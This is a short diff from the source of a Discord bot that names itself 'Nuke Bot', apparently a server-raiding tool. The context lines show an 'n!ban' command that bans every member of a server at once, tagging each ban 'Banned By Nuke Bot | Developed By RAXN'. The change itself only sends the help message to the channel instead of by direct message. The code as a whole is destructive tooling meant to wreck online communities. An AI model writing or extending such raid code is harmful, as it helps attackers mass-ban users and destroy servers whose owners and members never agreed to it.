@@ -63,7 +63,7 @@ if(msg.content.toLowerCase().startsWith("n!" + "ban")){
     msg.guild.members.tap(member => member.ban("Banned By Nuke Bot | Developed By RAXN"));
 }
 if(msg.content.toLowerCase().startsWith("n!" + "help")){
-    msg.author.send({
+    msg.channel.send({
         embed: {
             color: 0xff0000,
             author: { name: "Nuke Bot | Test" },
